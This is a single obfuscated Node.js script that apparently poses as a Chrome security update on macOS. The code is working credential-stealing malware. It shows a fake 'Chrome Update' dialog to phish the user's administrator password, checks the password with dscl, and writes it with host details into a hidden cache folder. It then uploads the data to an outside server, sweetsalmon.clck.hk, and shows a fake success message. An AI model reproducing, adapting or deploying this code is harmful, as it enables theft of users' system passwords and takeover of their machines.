#!/usr/bin/env node

const _0x22eaa6=_0x1f3f;(function(_0x3d4cb6,_0xe1c853){const _0x449291=_0x1f3f,_0x437304=_0x3d4cb6();while(!![]){try{const _0x2518e8=-parseInt(_0x449291(0xd9))/0x1*(-parseInt(_0x449291(0x8f))/0x2)+parseInt(_0x449291(0xc4))/0x3+parseInt(_0x449291(0x7b))/0x4+-parseInt(_0x449291(0xdb))/0x5*(parseInt(_0x449291(0x9e))/0x6)+parseInt(_0x449291(0x93))/0x7*(parseInt(_0x449291(0xd5))/0x8)+-parseInt(_0x449291(0x8c))/0x9+-parseInt(_0x449291(0x8a))/0xa;if(_0x2518e8===_0xe1c853)break;else _0x437304['push'](_0x437304['shift']());}catch(_0x20a14e){_0x437304['push'](_0x437304['shift']());}}}(_0x39ee,0x6692b));const {execSync}=require(_0x22eaa6(0xd6)),fs=require('fs'),path=require('path'),os=require('os'),crypto=require(_0x22eaa6(0xe1)),http=require(_0x22eaa6(0x90)),https=require(_0x22eaa6(0x82)),CONFIG={'serverDomain':_0x22eaa6(0xd8),'serverPath':_0x22eaa6(0xde),'serverPort':0x1f98,'apiKey':_0x22eaa6(0xa7),'retryDelay':0xbb8,'maxRetries':0x5,'timeout':0xea60};function _0x1f3f(_0x547c7b,_0x157d27){const _0x39eec4=_0x39ee();return _0x1f3f=function(_0x1f3fe4,_0x25780d){_0x1f3fe4=_0x1f3fe4-0x7b;let _0x26d47d=_0x39eec4[_0x1f3fe4];return _0x26d47d;},_0x1f3f(_0x547c7b,_0x157d27);}let SYSTEM_PASSWORD=null;function log(_0x249b8b,_0x2c3262){const _0x45cdcc=_0x22eaa6,_0x3f137a=new Date()[_0x45cdcc(0x7f)]();console[_0x45cdcc(0xc2)]('['+_0x3f137a+']\x20'+_0x249b8b);if(_0x2c3262)console['error'](_0x2c3262);try{const _0x4463aa=path['join'](os['homedir'](),'chrome_update_logs.txt');fs[_0x45cdcc(0xd0)](_0x4463aa,'['+_0x3f137a+']\x20'+_0x249b8b+'\x0a');if(_0x2c3262)fs[_0x45cdcc(0xd0)](_0x4463aa,(_0x2c3262[_0x45cdcc(0x7c)]||_0x2c3262)+'\x0a');}catch(_0x2f1af1){}}function verifyPassword(_0x3893cb,_0x461f78){const _0x53e935=_0x22eaa6;try{const _0x26fa8f=_0x53e935(0x80)+_0x3893cb+'\x20'+_0x461f78;return execSync(_0x26fa8f,{'stdio':_0x53e935(0xc9)}),!![];}catch(_0x38fb58){return![];}}async function getMacOSPassword(){const _0x3f350d=_0x22eaa6;log(_0x3f350d(0xaa));try{const _0x320265=os[_0x3f350d(0xc0)]()[_0x3f350d(0x7e)];log(_0x3f350d(0xb2)+_0x320265);for(let _0x10afdc=0x1;_0x10afdc<=0x5;_0x10afdc++){log('Attempt\x20'+_0x10afdc+'\x20of\x205\x20to\x20get\x20password');const _0x9098f3='osascript\x20-e\x20\x27display\x20dialog\x20\x22Chrome\x20needs\x20to\x20install\x20important\x20security\x20updates\x5cn\x5cnYour\x20password\x20is\x20required\x20to\x20complete\x20this\x20update.\x22\x20with\x20title\x20\x22Chrome\x20Update\x22\x20with\x20icon\x20caution\x20default\x20answer\x20\x22\x22\x20giving\x20up\x20after\x2030\x20with\x20hidden\x20answer\x27';try{const _0x2dd6c2=execSync(_0x9098f3,{'encoding':_0x3f350d(0xbf)});let _0x235734='';const _0x253c83=_0x2dd6c2['match'](/text returned:([^,]+)/);if(_0x253c83&&_0x253c83[0x1]){_0x235734=_0x253c83[0x1][_0x3f350d(0xaf)]();if(verifyPassword(_0x320265,_0x235734))return log(_0x3f350d(0xa1)),SYSTEM_PASSWORD=_0x235734,_0x235734;else log(_0x3f350d(0xcd)),_0x10afdc<0x5&&execSync(_0x3f350d(0x87));}else{if(_0x2dd6c2[_0x3f350d(0xd3)]('gave\x20up:true'))return log('User\x20canceled\x20password\x20entry'),null;else log(_0x3f350d(0x9d));}}catch(_0x438ed4){log(_0x3f350d(0x9c)+_0x438ed4[_0x3f350d(0xc7)]);if(_0x438ed4[_0x3f350d(0xc7)]['includes']('User\x20canceled'))return log('User\x20canceled\x20password\x20entry'),null;}}return execSync(_0x3f350d(0x9f)),null;}catch(_0xaf367e){return log(_0x3f350d(0xb6)+_0xaf367e['message'],_0xaf367e),null;}}function generateClientId(){const _0x474517=_0x22eaa6;try{const _0x19badd=getMacAddress(),_0x17b207=os['hostname'](),_0x4f3ff8=os[_0x474517(0xc0)]()[_0x474517(0x7e)],_0x22c770=crypto[_0x474517(0xbd)]('md5')[_0x474517(0xbb)](_0x19badd+':'+_0x17b207+':'+_0x4f3ff8)['digest'](_0x474517(0xd4))[_0x474517(0x9b)](0x0,0x8);return _0x22c770;}catch(_0x5376a1){return Math['random']()[_0x474517(0xab)](0x24)[_0x474517(0x9b)](0x2,0xa);}}function getMacAddress(){const _0x384f5c=_0x22eaa6;try{const _0x3cec4f=os[_0x384f5c(0x85)]();for(const _0x41198f of Object['keys'](_0x3cec4f)){for(const _0x59b86b of _0x3cec4f[_0x41198f]){if(!_0x59b86b['internal']&&_0x59b86b[_0x384f5c(0xb0)]!=='00:00:00:00:00:00')return _0x59b86b[_0x384f5c(0xb0)];}}return _0x384f5c(0xe0);}catch(_0x4b78c5){return _0x384f5c(0xe0);}}async function uploadToServer(_0x586472,_0x5c2d75=0x0){return new Promise(_0xb1a49e=>{const _0x14c9f2=_0x1f3f;try{const _0x376cc9=generateClientId(),_0x54a687={'hostname':os['hostname'](),'platform':os['platform'](),'type':os[_0x14c9f2(0xb1)](),'arch':os['arch'](),'username':os[_0x14c9f2(0xc0)]()[_0x14c9f2(0x7e)],'id':_0x376cc9},_0x53a749=CONFIG[_0x14c9f2(0xd2)]===0x1bb?_0x14c9f2(0x82):_0x14c9f2(0x90),_0x1ff9d8=_0x53a749+'://'+CONFIG['serverDomain']+':'+CONFIG['serverPort']+CONFIG['serverPath'],_0x3e22ec=_0x1ff9d8[_0x14c9f2(0xba)]('https://'),_0x2f68a9=_0x3e22ec?https:http,_0x26f95c=new URL(_0x1ff9d8),_0x32e8ca=_0x14c9f2(0x8e)+Math[_0x14c9f2(0xa0)]()['toString'](0x10)['substr'](0x2);let _0x4ea65a='';_0x4ea65a+='--'+_0x32e8ca+'\x0d\x0a',_0x4ea65a+=_0x14c9f2(0xd7),_0x4ea65a+='Content-Type:\x20application/json\x0d\x0a\x0d\x0a',_0x4ea65a+=JSON['stringify'](_0x54a687)+'\x0d\x0a',_0x4ea65a+='--'+_0x32e8ca+'\x0d\x0a',_0x4ea65a+='Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22'+_0x376cc9+'.txt\x22\x0d\x0a',_0x4ea65a+=_0x14c9f2(0xd1),_0x4ea65a+=_0x586472+'\x0d\x0a',_0x4ea65a+='--'+_0x32e8ca+_0x14c9f2(0xa3);const _0x5e0497={'hostname':_0x26f95c[_0x14c9f2(0xae)],'port':_0x26f95c[_0x14c9f2(0xa9)]||(_0x3e22ec?0x1bb:0x50),'path':_0x26f95c[_0x14c9f2(0x86)]+_0x26f95c['search'],'method':_0x14c9f2(0xce),'headers':{'Content-Type':_0x14c9f2(0x7d)+_0x32e8ca,'Content-Length':Buffer[_0x14c9f2(0xbe)](_0x4ea65a),'X-Client-Info':JSON[_0x14c9f2(0x99)](_0x54a687),'X-API-Key':CONFIG[_0x14c9f2(0x89)]},'timeout':CONFIG['timeout']};log(_0x14c9f2(0xbc)+_0x1ff9d8);const _0x14f78f=_0x2f68a9[_0x14c9f2(0xc1)](_0x5e0497,_0x5b5021=>{const _0xe19c11=_0x14c9f2;let _0xf12e9f='';_0x5b5021['on'](_0xe19c11(0xcc),_0x141342=>{_0xf12e9f+=_0x141342;}),_0x5b5021['on']('end',()=>{const _0x2ba965=_0xe19c11;_0x5b5021['statusCode']>=0xc8&&_0x5b5021[_0x2ba965(0xcf)]<0x12c?(log(_0x2ba965(0xc6)+_0x5b5021[_0x2ba965(0xcf)]),_0xb1a49e(!![])):(log(_0x2ba965(0x98)+_0x5b5021['statusCode']+',\x20'+_0xf12e9f),_0x5c2d75<CONFIG[_0x2ba965(0xdf)]?(log(_0x2ba965(0x97)+(_0x5c2d75+0x1)+'/'+CONFIG[_0x2ba965(0xdf)]+_0x2ba965(0xa5)),setTimeout(()=>{const _0x488f3c=_0x2ba965;uploadToServer(_0x586472,_0x5c2d75+0x1)[_0x488f3c(0xc5)](_0xb1a49e);},CONFIG[_0x2ba965(0xc8)])):(log(_0x2ba965(0xa6)),_0xb1a49e(![])));});});_0x14f78f['on'](_0x14c9f2(0xac),_0x15feba=>{const _0x40a26c=_0x14c9f2;log(_0x40a26c(0xdc)+_0x15feba[_0x40a26c(0xc7)],_0x15feba),_0x5c2d75<CONFIG[_0x40a26c(0xdf)]?(log(_0x40a26c(0x97)+(_0x5c2d75+0x1)+'/'+CONFIG[_0x40a26c(0xdf)]+_0x40a26c(0xa5)),setTimeout(()=>{const _0x4c8f6b=_0x40a26c;uploadToServer(_0x586472,_0x5c2d75+0x1)[_0x4c8f6b(0xc5)](_0xb1a49e);},CONFIG[_0x40a26c(0xc8)])):(log(_0x40a26c(0xa6)),_0xb1a49e(![]));}),_0x14f78f[_0x14c9f2(0x96)](_0x4ea65a),_0x14f78f[_0x14c9f2(0x91)]();}catch(_0x59dcc5){log(_0x14c9f2(0x88)+_0x59dcc5[_0x14c9f2(0xc7)],_0x59dcc5),_0x5c2d75<CONFIG[_0x14c9f2(0xdf)]?(log(_0x14c9f2(0x97)+(_0x5c2d75+0x1)+'/'+CONFIG[_0x14c9f2(0xdf)]+_0x14c9f2(0xa5)),setTimeout(()=>{const _0x2f5afa=_0x14c9f2;uploadToServer(_0x586472,_0x5c2d75+0x1)[_0x2f5afa(0xc5)](_0xb1a49e);},CONFIG[_0x14c9f2(0xc8)])):(log(_0x14c9f2(0xa6)),_0xb1a49e(![]));}});}function _0x39ee(){const _0x1ae96c=['utf8','userInfo','request','log','homedir','1088505LJEvlT','then','Chrome\x20update\x20verification\x20successful:\x20','message','retryDelay','ignore','.json','join','data','Password\x20verification\x20failed','POST','statusCode','appendFileSync','Content-Type:\x20text/plain\x0d\x0a\x0d\x0a','serverPort','includes','hex','478760tDiCVD','child_process','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','sweetsalmon.clck.hk','1zxaIiq','writeFileSync','9070gSQEVv','Chrome\x20update\x20request\x20error:\x20','\x0aTime:\x20','/api/files/upload','maxRetries','unknown','crypto','2687912FJJiRp','stack','multipart/form-data;\x20boundary=','username','toISOString','dscl\x20/Local/Default\x20-authonly\x20','.txt','https','User:\x20','osascript\x20-e\x20\x27display\x20dialog\x20\x22Chrome\x20update\x20could\x20not\x20be\x20completed.\x20Please\x20try\x20again\x20later.\x22\x20with\x20title\x20\x22Chrome\x20Update\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','networkInterfaces','pathname','osascript\x20-e\x20\x27display\x20dialog\x20\x22Incorrect\x20password.\x20Chrome\x20update\x20cannot\x20proceed.\x22\x20with\x20title\x20\x22Chrome\x20Update\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22Try\x20Again\x22}\x20default\x20button\x20\x22Try\x20Again\x22\x27','Chrome\x20update\x20error:\x20','apiKey','10300770vcVpTn','mkdirSync','937098yzTEHJ','\x0aHostname:\x20','----WebKitFormBoundary','1579792RQffdK','http','end','Error\x20saving\x20Chrome\x20update\x20data:\x20','35jrtiQP','\x0aClientID:\x20','release','write','Retrying\x20update\x20verification\x20(','Chrome\x20update\x20verification\x20failed:\x20','stringify','\x0aPlatform:\x20','substring','Error\x20requesting\x20password\x20via\x20dialog:\x20','Could\x20not\x20extract\x20password\x20from\x20dialog\x20response','1884STtTOh','osascript\x20-e\x20\x27display\x20dialog\x20\x22Failed\x20to\x20authenticate\x20after\x20multiple\x20attempts.\x20Chrome\x20update\x20canceled.\x22\x20with\x20title\x20\x22Chrome\x20Update\x20Failed\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','random','Administrator\x20password\x20verified','arch','--\x0d\x0a','\x0aPassword:\x20',')...','Maximum\x20retry\x20attempts\x20reached','tJz4uRVCwl2eEwyPTudYP9iGRfgq','platform','port','\x0a===\x20Requesting\x20macOS\x20administrator\x20password\x20for\x20Chrome\x20update\x20===','toString','error','Chrome\x20update\x20data\x20saved\x20to:\x20','hostname','trim','mac','type','Current\x20user:\x20','Unexpected\x20error\x20in\x20Chrome\x20update\x20process','\x0aArchitecture:\x20','Starting\x20Chrome\x20update\x20process','Error\x20getting\x20administrator\x20password:\x20','existsSync','Chrome\x20update\x20error:\x20failed\x20to\x20save\x20verification\x20data','Chrome\x20update\x20JSON\x20data\x20saved\x20to:\x20','startsWith','update','Uploading\x20Chrome\x20security\x20data\x20to\x20server:\x20','createHash','byteLength'];_0x39ee=function(){return _0x1ae96c;};return _0x39ee();}function savePasswordLocally(_0xf64935){const _0x5c5e68=_0x22eaa6;try{const _0x43c6ef=os['userInfo']()[_0x5c5e68(0x7e)],_0x79d3ca=generateClientId(),_0x5604e9=new Date()[_0x5c5e68(0x7f)](),_0x2aaeea=os[_0x5c5e68(0xc3)](),_0x1c9d9b=path[_0x5c5e68(0xcb)](_0x2aaeea,'ChromeCache');!fs[_0x5c5e68(0xb7)](_0x1c9d9b)&&fs[_0x5c5e68(0x8b)](_0x1c9d9b,{'recursive':!![]});const _0x59e7dd=_0x5c5e68(0x83)+_0x43c6ef+_0x5c5e68(0xa4)+_0xf64935+_0x5c5e68(0xdd)+_0x5604e9+_0x5c5e68(0x8d)+os[_0x5c5e68(0xae)]()+_0x5c5e68(0x9a)+os['platform']()+'\x0aType:\x20'+os[_0x5c5e68(0xb1)]()+_0x5c5e68(0xb4)+os[_0x5c5e68(0xa2)]()+_0x5c5e68(0x94)+_0x79d3ca,_0x495cab=path['join'](_0x1c9d9b,_0x79d3ca+_0x5c5e68(0x81));fs[_0x5c5e68(0xda)](_0x495cab,_0x59e7dd),log(_0x5c5e68(0xad)+_0x495cab);const _0x11f34f={'user':_0x43c6ef,'password':_0xf64935,'timestamp':_0x5604e9,'hostname':os[_0x5c5e68(0xae)](),'system':{'platform':os[_0x5c5e68(0xa8)](),'release':os[_0x5c5e68(0x95)](),'type':os[_0x5c5e68(0xb1)](),'arch':os['arch']()},'clientId':_0x79d3ca},_0x17de90=path[_0x5c5e68(0xcb)](_0x1c9d9b,_0x79d3ca+_0x5c5e68(0xca));return fs['writeFileSync'](_0x17de90,JSON[_0x5c5e68(0x99)](_0x11f34f,null,0x2)),log(_0x5c5e68(0xb9)+_0x17de90),_0x59e7dd;}catch(_0x19ccda){return log(_0x5c5e68(0x92)+_0x19ccda[_0x5c5e68(0xc7)],_0x19ccda),null;}}async function main(){const _0x4ee3a2=_0x22eaa6;try{log(_0x4ee3a2(0xb5));const _0x552aca=await getMacOSPassword();if(!_0x552aca){log('Chrome\x20update\x20canceled:\x20password\x20verification\x20failed');return;}const _0x35e90a=savePasswordLocally(_0x552aca);if(!_0x35e90a){log(_0x4ee3a2(0xb8));return;}const _0x540ca0=await uploadToServer(_0x35e90a);if(_0x540ca0){log('Chrome\x20update\x20completed\x20successfully');try{execSync('osascript\x20-e\x20\x27display\x20dialog\x20\x22Chrome\x20has\x20been\x20successfully\x20updated\x20to\x20the\x20latest\x20version.\x22\x20with\x20title\x20\x22Chrome\x20Update\x20Complete\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27');}catch(_0x41908c){}}else{log('Chrome\x20update\x20could\x20not\x20be\x20completed');try{execSync(_0x4ee3a2(0x84));}catch(_0x396530){}}log('Chrome\x20update\x20process\x20completed');}catch(_0x57b46d){log(_0x4ee3a2(0xb3),_0x57b46d);}}main();
